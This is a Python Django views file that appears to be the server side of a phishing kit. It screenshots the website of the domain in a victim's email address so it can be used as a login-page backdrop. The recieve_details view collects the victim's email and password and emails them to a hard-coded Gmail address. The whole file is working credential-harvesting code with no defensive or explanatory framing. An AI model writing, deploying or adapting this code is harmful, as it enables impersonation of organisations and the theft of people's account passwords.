import json
from django.shortcuts import render, redirect
from django.core.files import File
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.template.loader import render_to_string

from . import get_screenshot
from.models import MyScreenshots
from . import email_send


def capture_screenshot(request):
    if request.method == 'POST':
        url = request.POST.get('url')
        if url:
            
            email_t = url.split('@')[1]
            email_name = f'https://{email_t}'
            f_email = email_name.replace("https://","")

            screenshot_path = get_screenshot.get_my_screenshot(email_name)
            print(screenshot_path)
            
            product = MyScreenshots.objects.create(name=f'{f_email}')
            local_file = open(screenshot_path, "rb")
            djangofile = File(local_file)
            product.screenshot.save(f'{f_email}.png', djangofile)
            local_file.close()
           
            return redirect('frontend:capture_screenshot')


    return render(request, 'capture.html')



@csrf_exempt
def fetch_background_image(request):
    if request.method == "POST":

        data = request.body
        data = json.loads(data)
        url = data['email']
        if url != "":
            email_t = url.split('@')[1]
            email_name = f'https://{email_t}'
            f_email = email_name.replace("https://","")

            # check if image already exist in dtabase
            try:
                product = MyScreenshots.objects.get(name=f_email)
            except MyScreenshots.DoesNotExist:

                screenshot_path = get_screenshot.get_my_screenshot(email_name)
                
                product = MyScreenshots.objects.create(name=f'{f_email}')
                local_file = open(screenshot_path, "rb")
                djangofile = File(local_file)
                product.screenshot.save(f'{f_email}.png', djangofile)
                local_file.close()
            
            finally:
                doman = request.build_absolute_uri('/')
                domain = (doman[0:len(doman)-1])
                try:
                    response = f'{domain}{product.screenshot.url}'
                except:
                    response = f'{domain}/media/screenshots/google.com.png'
        else:
            doman = request.build_absolute_uri('/')
            domain = (doman[0:len(doman)-1])
            response = f'{domain}/media/screenshots/google.com.png'
    return JsonResponse({'bgimg': response},safe=False)


@csrf_exempt 
def recieve_details(request):
    if request.method == "POST":
        data = request.body
        data = json.loads(data)
        print(data)
        message = render_to_string('emails/received_details_email.html', 
                    {
                        'email': data["email"],
                        'password': data['f_password'],
                    })
        try:
            email_send.email_message_send('Email Details', message, 'tdkingzict@gmail.com' )
        except:
            pass
  
        return JsonResponse({'message': 'Data received'},safe=False)
    else:
        return JsonResponse({'error': 'Bad request'}, status=400)

